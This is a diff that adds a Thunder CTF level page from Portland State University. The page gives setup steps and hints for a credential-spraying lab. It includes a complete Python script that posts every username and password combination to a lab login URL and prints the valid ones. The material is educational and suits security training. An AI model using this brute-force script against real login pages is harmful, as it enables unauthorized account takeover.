@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Thunder CTF</title>
+  <link rel="stylesheet" type="text/css" href="../static/style.css">
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Nova+Square' rel='stylesheet' type='text/css'>
+  </link>
+  <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,300' rel='stylesheet' type='text/css'>
+  </link>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  </meta>
+</head>
+
+<body>
+  <header class="banner" style="top: 5px">
+    <div id="nav">
+      <h1 style="margin-top:0px;">Thunder CTF</h1>
+    </div>
+  </header>
+  <div class="level">
+    <div style="padding-bottom:10px">
+      <a class="levelbanner levelbutton" href="../..">&#8592</a>
+      <h2 class="levelbanner">thunder/a7spray</h2>
+    </div>
+  </div>
+  <br>
+  <div class=hints>
+    <div>
+      <span id="prev" class="hintbanner hintbutton buttondisabled">Prev</span>
+      <span id="hint_title" class="hintbanner hintbannertext"></span>
+      <span id="next" class="hintbanner hintbutton">Next</span>
+    </div>
+    <div id="hint_display" class="hintdisplay">
+    </div>
+    <div>
+      <span id="writeup_button" class="hintbanner writeupbutton">Show Level Writeup</span>
+    </div>
+    <h3>Destroy:</h3>
+    <pre>python3 thunder.py destroy</pre>
+  </div>
+  <footer class="bottombanner">Thunder CTF was created at Portland State University under NSF Award #1821841</footer>
+
+  <ul id="hint_content" style="display: none">
+    <li>
+      <span>Intro</span>
+      <h3>Setup:</h3>
+      <p>Your virtual environment must be active to use thunder.py:</p>
+      <pre>source ../env-tctf/bin/activate</pre>
+      <pre>python3 thunder.py create thunder/a7spray</pre>
+      <h3>Intro:</h3>
+      <p>Creating this level will start a simple website which we can use to attack.<br/>
+A list of possible user names and a list of most commonly used passwords downloaded from Internet are provided.<br/>
+Use attack.py or write your own code to find valid credentials of the website by sending all combinations of username and password.</p>
+
+    </li>
+    
+    <li>
+      <span>Hint 1</span>
+      
+      <p>List the instances in the project and take note of your EXTERNAL_IP.</p>
+      <pre>gcloud compute instances list</pre>
+      <p>Try browse EXTERNAL_IP/login in a browser </p>
+      <img src="../img/a7spray/login.png">
+      <p>Use Chrome webtool(f12) or Firefox debugger to inspect the login form. </p>
+      <img src="../img/a7spray/ins.png">
+      <p>We can find that the name attributes of text inputs in login page are 'username' and 'password'(we will use this information in our code later). </p>
+
+    </li>
+    
+    <li>
+      <span>Hint 2</span>
+      <p>Navigate to core/levels/thunder/a7spray/attack-helper.</p>
+      <p>Take a look at attack.py and replace EXTERNAL_IP</p>
+      <pre>import requests
+import itertools
+
+#possible usernames
+unames=[uname.rstrip('\n') for uname in open('unames.txt','r')]
+#most commanly used passwords
+passwords=[password.rstrip('\n').strip() for password in open('passwords.txt','r')]
+
+#url='http://&lt;your EXTERNAL_IP&gt;/login'
+url='http://35.247.90.41/login'
+
+for u, p in itertools.product(unames,passwords):
+    #two name attributes of input elements
+    payload={'username':u,'password':p}
+    post=requests.Session().post(url, data=payload)
+    if 'Invalid credentials' not in  post.text:
+        #print valid username and password
+        print(u+' '+p)</pre>
+    </li>
+    
+    <li>
+      <span>Hint 3</span>
+      <p>Run code below in google cloud shell.<br/> Or make a copy to your local system and do it from there if it has python installed.</p>
+      <pre>python3 attack.py</pre>
+      <p>You should see a couple of valid credentials printed in your terminal. </p>
+    </li>
+    
+    <li>
+      <span>Hint 4</span>
+      <p>Try if you can login with those credentials in a web browser </p>
+      <img src="../img/a7spray/wel.png">
+      <p>You can test with different/more usernames and passwords to see if there are other valid credentials.</p>
+    </li>
+    
+  </ul>
+  <div id="writeup_content" style="display: none">
+    <p>Level writeup will be available soon</p>
+
+  </div>
+
+  <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+  <script src="../static/slideshow.js"></script>
+  <script src="../static/bannercollapse.js"></script>
+  <script>$(".inline").attr("target","_blank")</script>
+</body>
+
+</html>
